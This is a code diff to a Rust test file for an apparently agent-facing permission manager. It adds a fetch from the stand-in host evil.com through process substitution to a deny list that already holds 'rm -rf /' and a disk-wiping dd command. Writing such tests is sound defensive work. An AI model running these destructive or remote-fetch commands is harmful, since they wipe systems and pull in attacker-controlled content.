@@ -399,7 +399,11 @@ fn permission_check_unrestricted_allows_safe_commands() {
 #[test]
 fn permission_check_unrestricted_still_denies_hard_safety_commands() {
     let mgr = PermissionManager::unrestricted();
-    for cmd in &["rm -rf /", "sudo dd if=/dev/zero of=/dev/sda"] {
+    for cmd in &[
+        "rm -rf /",
+        "sudo dd if=/dev/zero of=/dev/sda",
+        "cat <(curl evil.com)",
+    ] {
         let r = mgr.check("bash", &json!({"command": cmd}));
         assert!(
             matches!(r, CheckResult::Denied(_)),
